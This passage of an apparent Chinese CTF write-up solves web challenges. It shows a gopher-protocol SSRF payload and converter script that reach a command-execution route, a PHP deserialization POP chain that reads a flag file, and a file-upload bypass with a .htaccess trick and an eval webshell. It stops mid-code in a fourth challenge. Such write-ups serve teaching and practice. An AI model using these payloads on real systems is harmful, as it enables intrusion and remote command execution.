class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>只需关注Gop<strong>her</strong>和<strong>Manage</strong>这两个路由，<strong>Gopher路由</strong>这里就无法使用<strong>file://协议</strong>直接实现读取，同时发现<strong>Manage路由</strong>可以实现<strong>命令执行</strong><code>os.popen(request.form.get(&quot;cmd&quot;)).read()</code></p><p>由于<strong>Gopher路由</strong>可以<strong>处理进程</strong>，那么我们的思路就是通过<strong>Gopher路由</strong>打<strong>SSRF</strong>到<strong>Manage路由</strong>，从而实现<strong>命令执行</strong></p><p>这里借助<strong>gopher://协议</strong>实现<strong>SSRF</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求</span><br><span class="line"></span><br><span class="line">很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了</span><br><span class="line"></span><br><span class="line">格式</span><br><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line"></span><br><span class="line">注意不要忘记后面那个下划线<span class="string">&quot;_&quot;</span>，下划线<span class="string">&quot;_&quot;</span>后面才开始接TCP数据流，如果不加这个<span class="string">&quot;_&quot;</span>，那么服务端收到的消息将不是完整的，该字符可随意写</span><br></pre></td></tr></table></figure><p>同时注意<strong>Gopher路由</strong>这里还有<strong>解析</strong>为<strong>127.0.0.1</strong>的黑名单，下面有两种方式绕过</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>(缺省路由的写法也可以代表<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>) <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> 都代表本地</span><br><span class="line"><span class="number">127.</span>x.x.x 除了<span class="number">.1</span>都行，都是环回地址</span><br></pre></td></tr></table></figure><p>构造<strong>Manage路由</strong>的<strong>POST包</strong>，直接查看<strong>环境变量</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /Manage HTTP/1.1</span><br><span class="line">host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:7</span><br><span class="line"></span><br><span class="line">cmd=<span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>题目代码中，<code>result = subprocess.run([&quot;curl&quot;, &quot;-L&quot;, urlunparse(url)], capture_output=True, text=True)</code>，因此我们这里需要<strong>二次URL编码</strong>(也是<strong>gopher协议</strong>的常见操作了)，同时题目代码这里也可以看见开放的是<strong>8000端口</strong></p><p><code>payload</code>如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/Gopher?url=gopher://0.0.0.0:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv</span><br></pre></td></tr></table></figure><p>也发现了一个半自动化脚本吧</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;cmd=ls /&quot;</span></span><br><span class="line">payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_to_gopher</span>(<span class="params">http_request: <span class="built_in">str</span>, host: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">80</span></span>):</span><br><span class="line">    lines = http_request.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    request_line = lines[<span class="number">0</span>].split()</span><br><span class="line">    method = request_line[<span class="number">0</span>]</span><br><span class="line">    path = request_line[<span class="number">1</span>]</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    body = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line.strip():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            key, value = line.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">            headers[key.strip()] = value.strip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            body = line.strip()</span><br><span class="line"></span><br><span class="line">    gopher_payload = <span class="string">f&quot;<span class="subst">&#123;method&#125;</span> <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">f&quot;Host: <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        gopher_payload += <span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        gopher_payload += <span class="string">f&quot;\r\n<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    gopher_payload += <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    double_encoded_payload = urllib.parse.quote(urllib.parse.quote(gopher_payload))</span><br><span class="line">    gopher_url = <span class="string">f&quot;gopher://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>/_<span class="subst">&#123;double_encoded_payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> gopher_url</span><br><span class="line"></span><br><span class="line">http_request = <span class="string">f&quot;&quot;&quot;POST /Manage HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 0.0.0.0:8000</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;payload_len&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;payload&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(http_to_gopher(http_request, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>))</span><br></pre></td></tr></table></figure><h2 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Forbidden</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit3 = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;fruit4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fruit5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PHP反序列化，构造pop链</strong><br>介绍一下出现的魔法函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct 类的构造函数，在类实例化对象时自动调用构造函数</span><br><span class="line">__destruct  类的析构函数，在对象销毁之前自动调用析构函数</span><br><span class="line">__toString  当使用<span class="keyword">echo</span>或<span class="keyword">print</span>输出对象将对象转化为字符串形式时，会调用<span class="title function_ invoke__">__toString</span>()方法</span><br><span class="line">__get   当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数</span><br><span class="line">__call  调用不存在或不可见的成员方法时，PHP会先调用<span class="title function_ invoke__">__call</span>()方法来存储方法名及其参数</span><br><span class="line"><span class="title function_ invoke__">__set</span>(<span class="variable">$property</span>, <span class="variable">$value</span>)  当给一个对象的不存在或不可访问(<span class="keyword">private</span>修饰)的属性赋值时自动调用，传递属性名和属性值作为参数</span><br><span class="line">__invoke    当将一个对象作为函数进行调用时自动调用</span><br></pre></td></tr></table></figure><p>发现了<strong>原生类</strong>，<code>new $day2($day1)</code>，同时发现了<strong>遍历函数foreach()</strong>，直接借助<a href="https://www.anquanke.com/post/id/284901">DirectoryIterator类</a>进行<strong>目录遍历</strong>，然后就是<strong>SplFileObject类</strong>读取文件，其他能构造恶意代码的地方没找到</p><p>有了这个突破点，我们就可以逆回去，<strong>向上构造</strong>，看看哪个类可以触发<code>__get()</code>，发现<strong>Philosopher</strong>有个<strong>hey属性</strong>是<strong>不存在</strong>的，那么现在要触发的是<code>__invoke()</code>，一般找的都是<strong>return xxx();</strong>，有两个，就<code>CherryBlossom</code>吧</p><p>pop链为：<strong>CherryBlossom:<strong>destruct()-&gt;CherryBlossom::</strong>toString()-&gt;Philosopher::<strong>invoke()-&gt;Mystery::</strong>get()</strong></p><p><a href="https://www.cnblogs.com/-mo-/p/11582424.html">双重MD5绕过</a>，<strong>php弱比较</strong>中会截取字符串的数字，直至遇到字母截止，比如’11e33’，就会被读取为11，然后进行比较，改一下这个<code>py2</code>的脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        value1 = hashlib.md5(rnds.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line">            <span class="comment"># print(rnds)</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line">            <span class="comment"># 碰撞双md5</span></span><br><span class="line">            value2 = hashlib.md5(value1.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start+str_len] == substr:</span><br><span class="line">                <span class="built_in">print</span>(rnds + <span class="string">&quot;=&gt;&quot;</span> + value1 + <span class="string">&quot;=&gt;&quot;</span> + value2 + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    start_pos = <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><p>可以跑得一个，<strong>O7it1qaAgBbfAL9OVPyO</strong></p><p>至于怎么给<code>day1,day2</code>赋值，<a href="https://www.php.net/manual/zh/function.array-walk.php">官方文档</a>有提及的，涉及到回调处理，<code>day1</code>为值，<code>day2</code>为键</p><p>为了减少代码，其实可以只保留需要的属性即可，效果是一样的，而且出题人居然塞了这么多无用的类进来，晕</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span> = <span class="string">&quot;O7it1qaAgBbfAL9OVPyO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1 = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2 = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10 = <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="comment"># $a-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;DirectoryIterator = &quot;glob:///*&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;<span class="built_in">SplFileObject</span> = <span class="string">&quot;/flag44545615441084&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h2><p>尝试了一下，题目对文件后缀和文件内容进行了过滤，然后上传一张<code>gif</code>的时候发现，<code>GIF89a</code>可以绕过检测</p><p>然后我们也可以知道题目用的是<strong>Apache服务器</strong>，再上传一个<code>.htaccess</code>使其按<strong>PHP文件解析</strong></p><p>然后试多几次发现<strong>不限制尺寸</strong>是无法上传的，参考<a href="https://www.anquanke.com/post/id/241147#h2-19">博客</a></p><p><code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define width 1337</span></span><br><span class="line"><span class="comment">#define height 1337</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.gif&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><code>shell.gif</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>/images/shell.gif?1=system(&quot;cat /flag&quot;);</code></p><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;log_level&#x27;</span> =&gt; <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_input_length&#x27;</span> =&gt; <span class="number">100</span>,</span><br><span class="line">            <span class="string">&#x27;min_password_length&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">            <span class="string">&#x27;allowed_actions&#x27;</span> =&gt; [<span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;config[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logLevel</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logLevel</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logLevel = <span class="variable">$logLevel</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$level</span> = <span class="string">&#x27;info&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> === <span class="variable language_">$this</span>-&gt;logLevel) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[LOG] <span class="subst">$message</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ 